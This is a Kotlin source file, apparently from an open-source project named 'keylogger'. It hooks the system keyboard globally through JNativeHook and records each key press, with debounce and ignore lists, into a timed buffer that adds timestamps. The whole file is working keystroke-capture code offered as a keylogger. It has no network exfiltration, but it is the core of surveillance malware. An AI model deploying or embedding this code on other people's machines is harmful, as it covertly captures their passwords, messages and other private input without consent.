package com.github.secretx33.keylogger

import kotlinx.coroutines.CoroutineName
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import org.jnativehook.GlobalScreen
import org.jnativehook.NativeHookException
import org.jnativehook.keyboard.NativeKeyEvent
import org.jnativehook.keyboard.NativeKeyListener
import kotlin.system.exitProcess
import kotlin.time.Duration.Companion.milliseconds
import kotlin.time.Duration.Companion.seconds

class Keylogger : NativeKeyListener {

    private val keyFormat = KeyFormat()
    private val keyRegister = KeyRegister(timeBetweenFlushes = 500.milliseconds, appendTimestampAfter = 5.seconds)
    @Volatile
    private var lastPressedKeyRawCode = 0

    fun hook() {
        disableAnnoyingJnativehookLogger()
        try {
            GlobalScreen.registerNativeHook()
        } catch (e: NativeHookException) {
            System.err.println("${e.message}: ${e.stackTraceToString()}")
            exitProcess(1)
        }
        GlobalScreen.addNativeKeyListener(this)
    }

    override fun nativeKeyPressed(event: NativeKeyEvent) {
        if (IS_DEBUG_ENABLED) {
            println("event.keyCode = '${event.keyCode}' ('${NativeKeyEvent.getKeyText(event.keyCode)}'), event.keyChar = '${event.keyChar}', event.rawCode = ${event.rawCode}, event.modifiers = ${event.modifiers}, event.isActionKey = ${event.isActionKey}")
        }

        val lastPressedKeyRawCode = lastPressedKeyRawCode
        if (event.keyCode in BLACKLISTED_KEYS  // Blacklisted key
            || lastPressedKeyRawCode == event.rawCode && event.rawCode in DEBOUNCE_KEYS  // Debounced key
        ) return

        this.lastPressedKeyRawCode = event.rawCode

        coroutineScope.launch {
            val keyText = keyFormat.format(keyCode = event.keyCode, rawKeyCode = event.rawCode, isShiftPressed = event.hasModifier(NativeKeyEvent.SHIFT_MASK))
            keyRegister.saveKey(keyText)
        }
    }

    override fun nativeKeyTyped(event: NativeKeyEvent) {
    }

    override fun nativeKeyReleased(event: NativeKeyEvent) {
    }

    private companion object {
        /**
         * Keys to debounce (raw codes), that is, do not register consecutive presses of these keys.
         */
        val DEBOUNCE_KEYS = setOf(13, 27, 58, 91, 93, 144, 160, 161, 162, 163, 164, 165)

        /**
         * Keys that should never be logged. These are the common command keys, such as `Ctrl`, `Shift`, `Alt`, etc.
         */
        val BLACKLISTED_KEYS = setOf(3638, NativeKeyEvent.VC_CONTROL, NativeKeyEvent.VC_SHIFT, NativeKeyEvent.VC_ESCAPE, NativeKeyEvent.VC_PAGE_DOWN, NativeKeyEvent.VC_PAGE_UP, NativeKeyEvent.VC_NUM_LOCK, NativeKeyEvent.VC_VOLUME_DOWN, NativeKeyEvent.VC_VOLUME_UP, NativeKeyEvent.VC_VOLUME_MUTE, NativeKeyEvent.VC_MEDIA_PLAY, NativeKeyEvent.VC_PAUSE, NativeKeyEvent.VC_MEDIA_STOP, NativeKeyEvent.VC_MEDIA_NEXT, NativeKeyEvent.VC_MEDIA_PREVIOUS, NativeKeyEvent.VC_MEDIA_EJECT)
    }
}

val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob() + CoroutineName(Keylogger::class.java.simpleName))